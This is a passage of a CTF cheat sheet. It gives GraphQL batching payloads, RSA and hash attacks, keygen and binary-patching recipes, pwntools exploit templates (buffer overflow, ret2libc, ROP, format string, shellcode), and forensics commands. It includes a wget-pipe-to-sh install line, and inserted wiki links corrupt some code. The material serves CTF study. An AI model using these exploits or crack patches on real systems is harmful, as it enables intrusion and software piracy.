python3 jwt_tool.py TOKEN -X k -pk public.pem
`````

### 8.9. GraphQL

```bash
# Introspection query
{"query":"{__schema{types{name fields{name}}}}"}

# Dump schema
{"query":"{__schema{types{name fields{name type{name kind}}}}}"}

# Batching attack
[{"query":"{user(id:1){password}}"},{"query":"{user(id:2){password}}"},...]
`````

---

## 9. Cryptography

### 9.1. Classic Ciphers

```python
# Caesar cipher
def caesar_decrypt(text, shift):
    result = ""
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result += chr((ord(c) - base - shift) % 26 + base)
        else:
            result += c
    return result

# Vigenere
def vigenere_decrypt(text, key):
    result = ""
    key_idx = 0
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            shift = ord(key[key_idx % len(key)].upper()) - ord('A')
            result += chr((ord(c) - base - shift) % 26 + base)
            key_idx += 1
        else:
            result += c
    return result
`````

### 9.2. RSA Attacks

```python
# Small e (Cube root attack)
import gmpy2
def cube_root_attack(c, e=3):
    m, exact = gmpy2.iroot(c, e)
    if exact:
        return int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')
    return None

# Common modulus attack
def common_modulus(c1, [c2](../raw/r3v3rs3-sh3lls.md#command-and-control), e1, e2, n):
    # Extended Euclidean algorithm
    g, x, y = gmpy2.gcdext(e1, e2)
    if x < 0:
        c1 = gmpy2.invert(c1, n)
        x = -x
    if y < 0:
        c2 = gmpy2.invert(c2, n)
        y = -y
    m = (pow(c1, x, n) * pow(c2, y, n)) % n
    return int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')

# Wiener attack (small d)
# Use owllook or RsaCtfTool
`````

### 9.3. XOR Analysis

```python
# Single-byte XOR
def single_byte_xor(data, key):
    return bytes([b ^ key for b in data])

# Multi-byte XOR
def repeating_xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Find XOR key
def find_xor_key(data):
    best_key = None
    best_score = 0
    for key in range(256):
        decrypted = single_byte_xor(data, key)
        score = sum(1 for c in decrypted if chr(c) in 'etaoin shrdlu')
        if score > best_score:
            best_score = score
            best_key = key
    return best_key
`````

### 9.4. Hash Length Extension

```python
import struct
import hashlib

def md5_pad(message, length=None):
    # MD5 padding
    ml = len(message) * 8 if length is None else length
    message += b'\x80'
    while (len(message) * 8) % 512 != 448:
        message += b'\x00'
    message += struct.pack('<Q', ml)
    return message


---

## 10. Reverse Engineering

### 10.1. ELF Analysis (Linux)

```bash
# File info
file binary
strings binary | head -50
strings binary | grep -i password

# Symbols
nm binary
nm -C binary  # C++ demangled

# Dependencies
ldd binary
readelf -d binary

# Sections
readelf -S binary
objdump -d binary  # Disassemble

# Radare2
r2 binary
> aaa  # Analyze all
> afl  # List functions
> pdf @main  # Disassemble main
> VV   # Graph view
> iz   # Strings

# Ghidra (GUI)
# Drag and drop binary
# Analyze
# Navigate to main()
# Decompile (F5)
`````

### 10.2. [pe](../raw/w1n-1nt3rn4ls.md#pe) Analysis (Windows)

```bash
# Basic info
file binary.exe
strings binary.exe
strings binary.exe | grep -i "Microsoft\|Windows\|.dll"

# PE structure
pecheck binary.exe
pescan binary.exe

# Dependencies
ntldd binary.exe
dumpbin /dependents binary.exe

# Resource extraction
wrestool -x binary.exe -o extracted/

# Detect packers
diec binary.exe (Detect It Easy)
exeinfope binary.exe
peid binary.exe
`````

### 10.3. Decompilation

```bash
# Online decompilers
# https://dogbolt.org
# https://decompiler.com
# https://godbolt.org (compiler explorer)

# Java decompilers
jad file.class
cfr file.class
procyon file.class

# .NET decompilers
dnSpy file.exe
ILSpy file.exe
dotPeek file.exe

# Python decompilers
uncompyle6 file.pyc
decompyle3 file.pyc

# Online RE tools
# https://crackmes.one
# https://reverse.put.as
`````

### 10.4. Keygenning

```python
# Pattern recognition approach
# 1. Find where username/serial are compared
# 2. Reverse the algorithm
# 3. Write a keygen

# Example: Simple XOR keygen
def generate_serial(username):
    serial = ""
    for i, c in enumerate(username):
        serial += chr(ord(c) ^ i + 0x20)
    return serial

# Example: CRC-based keygen
def generate_key(name):
    import hashlib
    hash = hashlib.md5(name.encode()).hexdigest().upper()
    return "-".join([hash[i:i+4] for i in range(0, 16, 4)])
`````

### 10.5. Patching

```bash
# Binary patching with radare2
r2 -w binary
> s 0x1234  # Seek to address
> wa nop    # Write NOPs
> w x 9090  # Write bytes
> q

# With xxd
xxd binary | sed 's/1234: .../..../' | xxd -r > patched

# Common patches
# - Change JNZ to JZ (or vice versa)
# - NOP out check instructions
# - Change comparison value

# With Python
with open('binary', 'rb') as f:
    data = bytearray(f.read())
# Patch at offset 0x1234
data[0x1234:0x1238] = b'\x90\x90\x90\x90'
with open('patched', 'wb') as f:
    f.write(data)
`````

---

## 11. PWN / Binary Exploitation

### 11.1. [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow)

```python
# Basic structure
payload = b"A" * offset  # Fill buffer
payload += b"BBBB"        # Overwrite EBP/RBP
payload += p32(ret_addr)  # Return address

# Finding offset
# Use pattern: cyclic(2000)
# In GDB: pattern_search or find pattern
# Or: python3 -c "from pwn import *; print(cyclic(2000))"

# Exploit template
from pwn import *

# Connect
p = process('./vuln')  # Local
p = remote('target', 1337)  # Remote

# Create payload
offset = 0x42  # From pattern
payload = b"A" * offset
payload += p32(0xdeadbeef)  # EIP

# Send
p.sendline(payload)
p.interactive()
`````

### 11.2. Return-to-Libc (ret2libc)

```python
from pwn import *

offset = 0x42
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find gadgets
pop_rdi = 0x400683  # ROPgadget

# Build payload
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p = process('./vuln')
p.sendline(payload)
p.interactive()
`````

### 11.3. ROP Chain

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Automatically build ROP
rop.call(elf.symbols['system'], [next(elf.search(b'/bin/sh'))])
payload = b"A" * offset + rop.chain()

# Manual ROP
pop_rdi = 0x400683
ret = 0x400682

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(elf.search(b'/bin/sh').__next__())
payload += p64(elf.symbols['system'])
`````

### 11.4. Format String

```python
# Basic leak
"%x.%x.%x.%x.%s"
"%3\$x"  # Direct parameter access

# Leak stack
for i in range(20):
    p.sendline(f"%{i}\$p".encode())
    print(p.recv())

# Write
# %n writes number of bytes printed
"\x10\x20\x30\x40%10\$n"  # Write to address at position 10
`````

### 11.5. Shellcode

```python
from pwn import *

# Generate shellcode
shellcode = asm(shellcraft.sh())
# Or: shellcraft.amd64.linux.sh()

# Custom shellcode
context.arch = 'amd64'
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f  # /bin//sh
    push rdi
    push rsp
    pop rdi
    mov al, 59
    cdq
    syscall
''')

# NOP sled
payload = b"\x90" * 100 + shellcode + p64(buffer_addr)
`````

### 11.6. PWN Tools Setup

```bash
# pwntools
pip install pwntools

# GEF (GDB Enhanced Features)
wget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh

# PEDA
git clone https://github.com/longld/peda.git
echo "source ~/peda/peda.py" >> ~/.gdbinit

# pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ROPgadget
pip install ROPGadget
ROPgadget --binary ./vuln

# One-Gadget (find execve("/bin/sh") in libc)
gem install one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6
`````

---

## 12. Forensics

### 12.1. PCAP Analysis

```bash
# Basic stats
capinfos capture.pcap
tshark -r capture.pcap -q -z io,stat,1

# Filter HTTP
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "http.request" -T json

# Extract files
foremost capture.pcap
binwalk -e capture.pcap

# Follow TCP streams
tshark -r capture.pcap -z follow,tcp,ascii,0
tshark -r capture.pcap -Y "tcp.stream eq 0" -x

# DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# HTTP objects
tshark -r capture.pcap --export-objects "http,extracted_files/"
`````

### 12.2. Memory Analysis (Volatility)

```bash
# Get profile
volatility -f memory.dump imageinfo
volatility -f memory.dump kdbgscan

# Process list
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 pstree
volatility -f memory.dump --profile=Win10x64 psscan

# Network connections
volatility -f memory.dump --profile=Win10x64 netscan
volatility -f memory.dump --profile=Win10x64 connections
volatility -f memory.dump --profile=Win10x64 sockets

# Command line
volatility -f memory.dump --profile=Win10x64 cmdline
volatility -f memory.dump --profile=Win10x64 consoles

# Dump processes
volatility -f memory.dump --profile=Win10x64 procdump -p PID -D extracted/

# Password hashes
volatility -f memory.dump --profile=Win10x64 hashdump
volatility -f memory.dump --profile=Win10x64 lsadump

# Registry
volatility -f memory.dump --profile=Win10x64 hivelist
volatility -f memory.dump --profile=Win10x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"

# Malfind (detect injected code)
volatility -f memory.dump --profile=Win10x64 malfind

# Scan for specific things
volatility -f memory.dump --profile=Win10x64 filescan | grep -i ".txt\|.docx\|.pdf"
volatility -f memory.dump --profile=Win10x64 cmdline
volatility -f memory.dump --profile=Win10x64 windows
`````

### 12.3. Disk Images

```bash
# List partitions
mmls disk.dd
fdisk -l disk.dd

# Mount image
mount -o loop,ro disk.dd /mnt/forensic
mount -t ntfs-3g -o loop,ro,show_sys_files,streams_interface=windows disk.dd /mnt/forensic

# Autopsy (GUI)
autopsy

# Sleuth Kit
fls -r disk.dd  # List files
icat disk.dd INODE > recovered.txt  # Recover by inode
istat disk.dd INODE  # Inode info
`````

### 12.4. File Carving

```bash
# Foremost
foremost -i disk.dd -o output/

# Scalpel
scalpel disk.dd -o output/

# Bulk Extractor
bulk_extractor -o output/ disk.dd

# Photorec
photorec /log disk.dd

# Testdisk
testdisk disk.dd

